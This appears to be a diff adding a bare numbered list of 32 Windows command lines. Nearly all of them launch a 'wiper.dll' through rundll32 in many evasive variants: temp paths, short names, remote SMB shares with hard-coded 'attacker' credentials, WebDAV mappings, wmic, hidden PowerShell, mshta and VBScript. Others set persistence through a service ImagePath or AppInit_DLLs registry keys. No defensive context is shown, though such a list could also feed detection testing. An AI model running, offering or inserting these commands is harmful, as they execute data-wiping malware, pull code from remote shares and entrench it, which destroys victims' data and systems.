@@ -1,0 +1,32 @@
+1. rundll32.exe C:\Payloads\wiper.dll,StartWipe
+2. rundll32.exe %TEMP%\wiper.dll,StartWipe
+3. rundll32.exe %APPDATA%\Roaming\wiper.dll,StartWipe
+4. rundll32.exe %USERPROFILE%\wiper.dll,StartWipe
+5. rundll32.exe C:\PROGRA~2\Temp\wiper.dll,StartWipe
+6. cd %USERPROFILE%\Downloads && rundll32.exe .\wiper.dll,StartWipe
+7. rundll32.exe \\10.0.0.5\share\wiper.dll,StartWipe
+8. net use W: http://fileserver/wiper && rundll32.exe W:\wiper.dll,StartWipe
+9. net use Z: \\10.0.0.5\share /user:attacker Pass123 && rundll32.exe Z:\wiper.dll,StartWipe
+10. rundll32.exe %SystemRoot%\Temp\wiper.dll,StartWipe
+11. C:\Windows\SysWOW64\rundll32.exe C:\Temp\wiper.dll,StartWipe
+12. C:\Windows\Sysnative\rundll32.exe C:\Temp\wiper.dll,StartWipe
+13. rundll32.exe C:\Temp\wiper.dll,#1
+14. rundll32.exe C:\Temp\wiper.dll,StartWipe "dummyArg"
+15. @echo off && rundll32.exe "%~dp0wiper.dll",StartWipe
+16. rundll32.exe \\10.0.0.5\SHARE~1\wiper.dll,StartWipe
+17. set P=D: && net use %P% \\10.0.0.5\share && rundll32.exe %P%\wiper.dll,StartWipe
+18. rundll32.exe C:\Windows\System32\user32.dll,InjectedEntryPoint
+19. mklink /J C:\WinTemp C:\Temp && rundll32.exe C:\WinTemp\wiper.dll,StartWipe
+20. rundll32.exe %LOCALAPPDATA%\Temp\wiper.dll,StartWipe
+21. schtasks /run /TN "Updater" && rundll32.exe C:\Temp\wiper.dll,StartWipe
+22. start "" /b rundll32.exe C:\Temp\wiper.dll,StartWipe
+23. cmd /c "rundll32.exe C:\Temp\wiper.dll,StartWipe"
+24. wmic process call create "rundll32.exe C:\Temp\wiper.dll,StartWipe"
+25. powershell Start-Process rundll32.exe -ArgumentList "C:\Temp\wiper.dll,StartWipe" -WindowStyle Hidden
+26. powershell (Get-WmiObject Win32_Process).Create("rundll32.exe C:\Temp\wiper.dll,StartWipe")
+27. at 14:00 /interactive "rundll32.exe C:\Temp\wiper.dll,StartWipe"
+28. vbscript: Set s=CreateObject("Shell.Application"): s.ShellExecute "rundll32.exe","C:\Temp\wiper.dll,StartWipe", "", "open", 0
+29. mshta "<SCRIPT>new ActiveXObject('WScript.Shell').Run('rundll32.exe C:\Temp\wiper.dll,StartWipe',0);</SCRIPT>"
+30. Scheduled Task XML with <Actions><Exec><Command>rundll32.exe</Command><Arguments>C:\Temp\wiper.dll,StartWipe</Arguments></Exec></Actions>
+31. reg add HKLM\SYSTEM\CurrentControlSet\Services\SomeService /v ImagePath /d "rundll32.exe C:\Temp\wiper.dll,StartWipe" /f
+32. reg add HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows /v AppInit_DLLs /d "C:\Temp\wiper.dll" /f
